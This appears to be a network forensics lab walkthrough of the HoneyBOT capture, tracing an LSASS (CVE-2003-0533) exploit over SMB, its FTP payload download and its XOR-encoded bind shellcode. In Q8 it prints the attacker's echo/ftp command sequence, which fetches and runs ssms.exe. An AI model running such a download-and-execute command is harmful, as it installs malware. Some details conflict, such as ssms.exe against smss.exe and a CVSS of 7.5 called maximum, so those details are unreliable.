**I.Introduction**
- This lab focuses on the forensic investigation of a network intrusion targeting a honeypot system, where an attacker exploits a vulnerability to gain unauthorized access, execute malicious code, and establish remote control. By analyzing the provided PCAP (packet capture) file, we will reconstruct the attack sequence, identify key artifacts, and uncover the tactics used by the attacker. The investigation requires a deep dive into network forensics, exploit analysis, and malware behavior, making use of industry-standard tools such as Wireshark, scdbg and IP intelligence services.

- The attack follows a structured flow, beginning with network reconnaissance and progressing through initial access, remote code execution, and persistence mechanisms. Evidence of automated exploitation attempts is present, hinting at the use of a pre-built exploit script or malware framework. A key objective of this analysis is to determine the source of the attack, the methods used to exploit the target, and any **indicators of compromise (IOCs)** left behind. The presence of **DCE/RPC** traffic over **SMB**, along with specific encoded payloads, suggests a well-known historical exploit commonly used in remote Windows attacks. As the investigation progresses, deeper forensic techniques will be applied, such as extracting and analyzing malicious payloads, decoding shellcode behavior, and identifying obfuscation techniques used by the attacker. The discovery of encoded execution traces, function resolution patterns, and memory manipulation techniques will provide insight into how the exploit was delivered and executed. Additionally, tracking the attack’s footprint through external services like VirusTotal will help correlate known malware samples with the identified artifacts.

- By the end of this lab, we will have uncovered the full extent of the intrusion, understood the attacker’s techniques, and gained practical experience in network traffic analysis, exploit behavior, and malware reverse engineering. This walkthrough is designed to provide a comprehensive step-by-step forensic breakdown without relying on pre-existing assumptions, allowing us to reach well-founded conclusions based on observable evidence.


**II. Analysis**

**Q1: What is the attacker's IP address?**
  - To determine the attacker's IP address in this investigation, we begin by analyzing the provided network traffic capture using Wireshark, a widely used network protocol analyzer. Wireshark allows for deep packet inspection and statistical analysis, making it an essential tool for incident response and forensic investigations. Loading the HoneyBOT.pcap file into Wireshark provides visibility into all network interactions recorded during the attack, enabling us to identify the source of the malicious activity. One of the most effective ways to get an overview of the network endpoints involved in the captured traffic is by navigating to **Statistics > Endpoints** and selecting the **IPv4 tab**.

    ![image-1.1](images/Question1-1.png)

  - This reveals a list of IP addresses that participated in the network communication, along with details such as the number of packets sent and received, the total volume of data exchanged, and, in some cases, additional metadata like geolocation and **Autonomous System (AS)** information. The key observation here is that one IP address has significantly higher transmitted bytes compared to received bytes, indicating that it was the initiator of the communication. In this case, the address **98.114.205.102** appears to be the most active in transmitting data, while **192.150.11.111** shows a pattern of primarily receiving data. This strongly suggests that the latter is a victim machine, while the former is the likely attacker.

  -   To further validate this finding, we examine the first few packets in the network capture. A fundamental aspect of network forensics is analyzing how a connection is initiated, especially when dealing with potential cyber threats. In this case, the attack begins with **98.114.205.102** sending a **TCP SYN packet** to **192.150.11.111** on port **445**, which is commonly associated with the **Server Message Block (SMB) protocol**.
    ![image-1.2](images/Question1-2.png)

  -  This packet is the first step in the **three-way handshake**, a process used to *establish* a **TCP connection**. The handshake continues as **192.150.11.111** responds with a **SYN-ACK**, acknowledging the connection request, and finally, the attacker completes the handshake with an **ACK**. The presence of this handshake confirms that **98.114.205.102** is the originator of the interaction, reinforcing the hypothesis that this is the attacker's IP address. Further inspection of subsequent packets reveals additional signs of malicious intent. The attacker's IP is seen engaging in **SMB**-related communication, which could indicate an attempt to exploit a vulnerability in the target system. **SMB** is frequently targeted in automated exploitation attempts, such as those involving EternalBlue, a well-known Windows exploit used in attacks like **WannaCry** and **NotPetya**.

  - Based on this analysis, it is clear that the attack was initiated from **98.114.205.102**, making it the attacker's IP address. This information is critical for further investigation, such as performing an IP lookup to determine its origin, checking for previous malicious activity associated with this address, or using threat intelligence platforms to correlate this attack with known campaigns.

    Answer: **98.114.205.102**

**Q2: What is the target's IP address?**

   - From the analysis performed in the previous question, we know that the target's IP address is **192.150.11.111.**

    Answer: **192.150.11.111.**

**Q3: Provide the country code for the attacker's IP address (a.k.a geo-location).**

   - Understanding the geographical location of an IP address plays a crucial role in cybersecurity investigations. IP geolocation refers to the process of mapping an IP address to a physical location, typically including details such as the country, region, city, and sometimes the Internet Service Provider (**ISP**). While this data is not always perfectly accurate due to factors like VPN usage, proxy servers, or dynamic IP allocations, it provides valuable intelligence in identifying the possible origin of cyber threats. Security analysts and incident responders often use IP geolocation to track malicious actors, correlate attacks with known threat groups, and enforce region-specific security policies. To determine the location of the attacker's IP address, an online IP lookup tool was used. These tools aggregate geolocation data from multiple sources, such as **vedbex.com**,**IP2Location** and **ipinfo.io** , to provide insights into where an IP address is registered. The queried IP, **98.114.205.102**, was identified as being located in the United States.

   - More specifically, different geolocation databases associate it with locations in New Jersey and Pennsylvania, indicating that the IP is assigned to a region within the United States but may vary slightly based on the database used. The ISP associated with this IP is Verizon Business, which suggests that it is part of a commercial internet service infrastructure rather than a residential or cloud-hosted network. From this lookup, the country code for the attacker's IP address is US, confirming that the originating IP is registered in the United States. While this does not necessarily mean the actual attacker is physically located there, it provides a starting point for further investigation as attackers frequently use compromised machines or proxies to obscure their true location, so additional correlation with other forensic data would be needed to establish attribution more definitively.
    ![image-3](images/Question3.png)

     Answer: **US**

**Q4 How many TCP sessions are present in the captured traffic?**
   - A TCP session represents a complete connection between two endpoints, following the **TCP three-way handshake** process, which consists of **SYN**, **SYN-ACK**, and **ACK** packets. This handshake establishes a reliable connection, allowing data exchange between a client and a server. In network forensics, analyzing **TCP sessions** helps investigators understand communication patterns, detect anomalies, and identify potential malicious activity. To determine the number of **TCP sessions** present in the captured traffic, Wireshark's Conversations feature is used. By navigating to **Statistics > Conversations** and selecting the **TCP** tab, we obtain a detailed breakdown of all TCP connections in the PCAP file.

   - The displayed data includes details such as **source** and **destination** **IP addresses**, **ports**, **packet counts**, **data volume exchanged**, and **session duration**. The analysis reveals that there are **five TCP sessions** present in the captured traffic. Each row in the TCP conversation table represents an individual session, indicating a distinct connection between the attacker's IP **98.114.205.102** and the victim honeypot at **192.150.11.111**. These sessions involve various ports, including **port 445** (commonly associated with **SMB**), **port 1821**, and other dynamically assigned ports. The presence of multiple TCP sessions suggests that the attacker made repeated connection attempts, which is characteristic of automated scanning, exploitation attempts, or persistence mechanisms used to maintain access. By examining the session duration and data exchanged, we can infer additional details about the attacker's behavior. Some sessions show a higher number of exchanged packets and data volume, indicating extended interaction, while others are short-lived, possibly representing failed connection attempts or reconnaissance activity.
    ![image-4](images/Question4.png)

    Answer: **5**

**Q5. How long did it take to perform the attack (in seconds)?**
   - The duration of an attack is a critical factor in understanding the attacker's behavior and assessing the efficiency of the security measures in place. A quick attack completion time often indicates the use of automated tools, while a prolonged attack may suggest manual intervention. To determine how long the attack lasted, Wireshark's Capture File Properties feature is utilized, providing key metadata about the packet capture, including timestamps that mark the beginning and end of the recorded network activity. By navigating to **Statistics > Capture File Properties**, the capture details reveal the First packet timestamp and the Last packet timestamp, indicating when the first and last recorded network interactions occurred.
    ![image-5](images/Question5.png)


   - In this case, the attack began at **2009-04-20 03:28:28** and ended at **2009-04-20 03:28:44**. The difference between these two timestamps represents the total duration of the attack, which is **16 seconds**. This short time frame strongly suggests that the attack was conducted using an automated exploitation tool rather than manual commands entered by a human attacker. The rapid exchange of packets, including connection attempts, **SMB protocol negotiation**, and **authentication requests**, aligns with the behavior of common attack scripts designed to quickly identify and exploit vulnerabilities in a target system. In a real-world scenario, such quick execution could indicate a reconnaissance or initial access phase, where the attacker attempts to establish a foothold before proceeding with further malicious actions.
     Answer: **16**

**Q6: Provide the CVE number of the exploited vulnerability.**
   - Analyzing network traffic can reveal signs of exploitation attempts, especially when certain protocols associated with known vulnerabilities are present. One such protocol is **DCE/RPC (Distributed Computing Environment / Remote Procedure Call)**, which is used for remote management and execution of services on Windows systems. This protocol is often exploited in attacks targeting Microsoft Windows, particularly when used in combination with **SMB** (Server Message Block).
        ![image-6.1](images/Question6-1.png)

   - A deep analysis of the captured network traffic reveals an exploitation attempt targeting **DCE/RPC** over **SMB (Server Message Block)**.**DCE/RPC** is widely used in Windows environments for remote management, system administration, and Active Directory operations. However, this protocol has been historically vulnerable to exploitation, particularly when used over SMB named pipes, which allow for remote execution of privileged commands. Attackers frequently abuse these services to gain unauthorized access, escalate privileges, or manipulate domain controller settings. To identify the specific vulnerability being exploited, Wireshark’s Protocol Hierarchy Statistics feature was used. The breakdown of protocols in the network traffic highlights the presence of SMB named pipes and **DCE/RPC** traffic, specifically involving the DsRolerUpgradeDownlevelServer operation. The presence of these requests in the capture is a strong indication of an attempted privilege escalation attack. Applying a **dcerpc filter** in Wireshark allows us to further investigate the network packets related to this attack. The traffic log shows that the attacker’s IP address, **98.114.205.102**, sent an **RPC** Bind request to the victim system at **192.150.11.111**, establishing a remote session. This is followed by a DsRolerUpgradeDownlevelServer request, which is a function within Windows **RPC** that allows an attacker to alter domain controller settings.
        ![image-6.2](images/Question6-2.png)



   - The response from the victim system confirms successful execution, as indicated by the Windows Error Code: **WERR_OK** (**0x00000000**).
        ![image-6.3](images/Question6-3.png)

   - The attacker likely leveraged this function to **elevate privileges** or **manipulate the domain configuration** remotely. The observed attack pattern corresponds to **CVE-2003-0533**, a remote code escalation vulnerability in Microsoft **Local Authority Security Subsystem Service (LSASS.exe)**.
        ![image-6.4](images/Question6-4.png)
        ![image-6.5](images/Question6-5.png)

   - **CVE-2003-0533** is a **critical** security vulnerability discovered in 2003 within Microsoft Windows operating systems. It stems from a buffer overflow in the **Local Security Authority Subsystem Service (LSASS)**, a core component responsible for enforcing security policies and handling user authentication. The vulnerability arises due to improper validation of input lengths in **LSASS**, allowing attackers to send specially crafted authentication requests that overflow the buffer. This overflow could lead to arbitrary code execution, enabling malicious actors to take full control of the affected system. The exploitation of this vulnerability grants attackers the ability to execute code with SYSTEM-level privileges, the highest level of access in Windows. This means an attacker could install malware, manipulate or steal data, create new user accounts, or disrupt system operations entirely. The flaw is particularly dangerous because it can be exploited remotely over a network without requiring any user interaction. Attackers could target vulnerable systems by sending malicious requests directly to the **LSASS** process, making it a significant threat to exposed networks. The severity of **CVE-2003-0533** is reflected in its maximum CVSS score of **7.5**, underscoring its critical risk level. This score accounts for the ease of remote exploitation, the lack of required authentication, and the total system compromise it enables. The vulnerability remains a prominent example of the dangers posed by buffer overflows in critical system services and the cascading impact of delayed patch management.

    Answer: **CVE-2003-0533**

**Q7: Which protocol was used to carry over the exploit?**
   - The exploit observed in this network capture was carried over the **SMB (Server Message Block)** protocol, specifically through **SMB** named pipes facilitating **DCE/RPC** **(Distributed Computing Environment / Remote Procedure Call)** communication.
        ![image-7.1](images/Question7-1.png)


   - **SMB** is a widely used protocol in Windows environments, allowing file and printer sharing, inter-process communication, and remote administration. However, it has been frequently exploited in various attacks, particularly when used in conjunction with **DCE/RPC**, which enables remote code execution. Analyzing the Protocol Hierarchy Statistics in Wireshark reveals that the attack traffic involves **SMB Pipe Protocol**, which is commonly used for inter-process communication on Windows systems.

      Answer: **SMB**

**Q8 Which protocol did the attacker use to download additional malicious files to the target system?**
   - After gaining access to the victim system, the attacker attempts to download and execute additional malicious files. A thorough inspection of the **Protocol Hierarchy Statistics** in Wireshark shows that a notable portion of the network traffic is categorized under raw data transmission.
        ![image-8.1](images/Question8-1.png)

   - This suggests that an unstructured data exchange occurred outside the bounds of standard protocols like **HTTP** or **SMB** file transfer. By applying a data filter in Wireshark, we can isolate and examine the relevant packets. Within the filtered results, a TCP-based communication between the attacker’s IP **98.114.205.102** and the victim system **192.150.11.111** reveals a command sequence that resembles an **FTP (File Transfer Protocol)** script.
        ![image-8.2](images/Question8-2.png)

   - The contents of these packets contain Windows command-line instructions directing the target system to download a file named ssms.exe. The command sequence is as follows:

   **echo open 0.0.0.0 8884 > o**
   **echo user 1 1 >> o**
   **echo get ssms.exe >> o**
   **echo quit >> o**
   **ftp -n -s:o**
   **del /F /Q o & ssms.exe**
        ![image-8.3](images/Question8-3.png)

   - This sequence indicates an automated FTP session initiated by the attacker. The commands first create an FTP script file, named o, which specifies the FTP connection details, including the remote server address (**0.0.0.0**) and port **8884**, a non-standard port likely used to evade detection. The script then logs into the server using the credentials 1 1, retrieves **ssms.exe**, and exits the session. Finally, the script is executed using the **ftp -n -s:o** command, instructing the system to process the FTP commands from the script file. Once the transfer is complete, the script file is deleted, and the downloaded **ssms.exe** is executed, potentially launching a malicious payload. This technique is commonly used by attackers to retrieve and execute secondary payloads on compromised machines. Using **FTP** in this manner allows the attacker to maintain a low profile, as FTP traffic is often overlooked in network monitoring compared to HTTP-based downloads. Additionally, the use of a non-standard **FTP port (8884)** makes it less likely to be flagged by **intrusion detection systems**(**IDS**) that primarily monitor traditional **FTP ports (21)**.

   - In conclusion, the attacker utilized **FTP** **(File Transfer Protocol)** over a custom port (**8884**) to download and execute the malicious file ssms.exe on the victim system.
    Answer: **ftp**

**Q9: What is the name of the downloaded malware?**
  - Based on the analysis of the executed command in the previous question, the attacker downloaded an executable file named **smss.exe** over **FTP**.

   Answer: **smss.exe**

**Q10: The attacker's server was listening on a specific port. Provide the port number.**

   - Based on the previous command analysis, the attacker connected to the server on port **8884**, which is a non standard FTP port.
        ![image-10](images/Question10.png)

    Answer: **8884**

**Q11: When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD**
  - To determine when the malware involved in this attack was first submitted to VirusTotal, we need to extract the binary file from the captured network traffic, compute its **SHA-256 hash**, and perform a search on VirusTotal for existing records of the file. This process helps confirm whether the malware is known, its reputation, and its first appearance in public databases. The first step is to identify the file transfer within the network capture. By analyzing the captured packets in Wireshark, we observe an FTP-based file transfer where the attacker downloads a file named **ssms.exe** onto the victim machine.
    ![image-11.1](images/Question11-1.png)

- By following the TCP stream corresponding to this transaction, we can reconstruct the transmitted data. The payload of these packets contains binary data, evident from the **MZ header**, which is a signature for Windows executables (.exe files).
    
    ![image-11.2](images/Question11-2.png)

- Wireshark allows us to extract this binary by navigating to **"Follow TCP Stream"** and saving the raw content as a binary file.
    ![image-11.3](images/Question11-3.png)


- Once extracted, we proceed to calculate the **SHA-256** hash of the file. This is done using the **Get-FileHash** command in PowerShell, as shown in the analysis:
**Get-FileHash .\extracted-mz -Algorithm SHA256**
    ![image-11.4](images/Question11-4.png)

- This command computes the cryptographic hash of the extracted binary, producing a unique fingerprint that can be used to identify the file across malware databases. The obtained **SHA-256 hash **is **B14CCB3786AF7553F7C251623499A7FE67974DDE69D3DFFD65733871CDDF6B6D**.

- With the computed hash, the next step is to search for this identifier on VirusTotal, an online malware analysis platform that aggregates results from multiple antivirus engines. By entering the hash in VirusTotal’s search bar, we retrieve detailed information about the file, including its detection history, classification, and relationships with known malware families.
    ![image-11.5](images/Question11-5.png)
    ![image-11.6](images/Question11-6.png)
- From the VirusTotal results, we find that the first submission date for this file was **2007-06-27**. This indicates that the malware has been publicly known for several years and has likely been involved in past cyberattacks. The presence of this file in VirusTotal's database suggests that it is a recognized malicious executable, possibly associated with a known malware family. This analysis highlights the importance of hash-based threat intelligence in malware investigations. By using unique file hashes, we, as security teams, can quickly determine if a file has been previously identified, track its usage in attacks, and correlate it with existing threat reports. Regular monitoring of malware repositories like VirusTotal allows for proactive detection and mitigation of known threats before they can impact a network.
    Answer: **2007-06-27**

**Q12: What is the key used to encode the shellcode?**
  - The attack observed in this scenario exploits a buffer overflow vulnerability in the **LSASS** service, specifically targeting **CVE-2003-0533**. A **buffer overflow attack** occurs when an attacker sends more data than the allocated memory buffer can handle, leading to unintended code execution. In this case, the exploit payload contains a large buffer filled with specific byte patterns, including a **NOP sled**, which is a sequence of **0x90 (NOP)** instructions.
        ![image12-1](images/Question12-1.png)

  - The purpose of a **NOP sled** is to guide the instruction pointer towards the actual shellcode, ensuring reliable execution even if the memory address calculations are slightly off. This technique has been widely used in exploitation frameworks to increase the chances of successful execution. The Wireshark capture reveals a structured attack pattern where the attacker sends a long string of repeated characters, followed by what appears to be encoded shellcode. The buffer consists of a large section of NOPs, ensuring that execution smoothly transitions to the embedded payload. The next portion of the payload contains the actual shellcode. By extracting this payload from the network traffic, we can analyze it further to understand its functionality and determine any obfuscation techniques used. To analyze the shellcode, it was processed using scdbg, a shellcode emulator that allows for safe execution and debugging of malicious code. Running scdbg on the extracted shellcode revealed key Windows API calls used by the exploit, including GetProcAddress, LoadLibraryA, and CreateProcessA.
        ![image12-2](images/Question12-2.png)

  - These functions indicate that the shellcode is designed to open a reverse shell or execute commands on the target machine. Additionally, scdbg provided insight into the structure of the shellcode, showing that it dynamically resolves function addresses to execute system-level actions. A closer inspection of the shellcode execution flow revealed the presence of XOR-based obfuscation. Attackers often use XOR encoding to disguise malicious payloads, making them harder to detect using traditional signature-based security tools. By running scdbg with verbose logging enabled, the /v option, it became evident that the shellcode employs an XOR operation to decode itself before execution.
        ![image12-3](images/Question12-3.png)

  - The XOR decryption loop applies a static XOR key to the encoded data, revealing the original shellcode instructions. The analysis confirmed that the key used in the XOR decryption routine is **0x99**, meaning that every byte of the encoded shellcode was XOR’d with this value before execution. This obfuscation technique ensures that the payload remains hidden until it reaches memory and executes dynamically. The use of XOR encoding in this attack demonstrates a common evasion technique used by malware authors to bypass detection mechanisms. By encrypting the shellcode and only decoding it at runtime, attackers can effectively conceal their payloads from static analysis and traditional signature-based intrusion detection systems. This reinforces the need for behavioral analysis and heuristic-based detection methods in cybersecurity defenses. Understanding how these obfuscation techniques work allows defenders to develop better countermeasures, such as detecting decryption routines in memory or analyzing execution flow to uncover hidden payloads.
     Answer: **0x99**


**Q13: What is the port number the shellcode binds to?**
  - Running **scdbg** on the shellcode provided valuable insights into its functionality, specifically highlighting the system calls and operations it performs. The output from **scdbg** revealed a sequence of Windows API calls, including **GetProcAddress**, **LoadLibraryA**, and **CreateProcessA**, which are commonly used in malware to dynamically load libraries and execute system commands. A crucial discovery in the analysis was the presence of **WSASocketA** and bind system calls, which indicate that the shellcode attempts to establish a network listener.
                ![image13-1](images/Question13-1.png)

  - The bind function call, specifically, was used to associate the shellcode with a port number, allowing an attacker to connect to the compromised machine remotely. The output of scdbg showed that the bind call was executed with port number **1957**, confirming that the shellcode was designed to listen for incoming connections on this port. This type of behavior is typical of bind shells, where the attacker connects directly to the infected machine to gain control. By binding to port **1957**, the shellcode effectively sets up a backdoor, enabling the attacker to interact with the compromised system remotely.
     Answer: **1957**

**Q14: The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?**
  - The shellcode executed in this attack utilizes a common **position-independent code (PIC)** technique to determine its location in memory. Instead of relying on hardcoded addresses, which may not be consistent across different environments, the shellcode dynamically resolves its required functions by querying the **Process Environment Block (PEB)**. The **PEB** is a structure in Windows that contains information about the currently running process, including loaded modules, memory layout, and execution state. By traversing this structure, the shellcode can locate the base address of essential system libraries, such as **kernel32.dll**, which contains critical functions needed for execution.

  - The execution trace reveals that the shellcode accesses the LDR data structure, a part of the PEB responsible for maintaining a list of loaded DLLs.
        ![image14-1](images/Question14-1.png)
  - The instructions show that the shellcode is moving values from offsets within the PEB into registers, effectively parsing the module list to identify the location of system libraries. Specifically, it loads the address of the InMemoryOrderModuleList, which contains references to loaded DLLs in the process space. By iterating through this list, the shellcode can find the base address of **kernel32.dll**, which is crucial for resolving APIs necessary for execution. The final step in this technique involves resolving function addresses dynamically. The shellcode extracts the **Export Address Table (EAT)** from **kernel32.dll** and searches for specific API function names. The dump of the shellcode memory shows a reference to **GetProcAddress**, confirming that the shellcode uses this function to resolve additional APIs dynamically. Since **GetProcAddress** is part of **kernel32.dll**, it is evident that the shellcode is querying this OS file to locate necessary system functions. This method allows the shellcode to operate in various environments without relying on hardcoded memory addresses, increasing its stealth and adaptability. The use of **kernel32.dll**for function resolution is a common technique in malware, as it provides access to essential system APIs required for process manipulation, memory allocation, and execution flow control. By leveraging the **PEB** and **LDR** structures, the shellcode avoids reliance on standard library loading mechanisms, making it more difficult for security solutions to detect and disrupt its execution.
     Answer: **kernel32.dll**
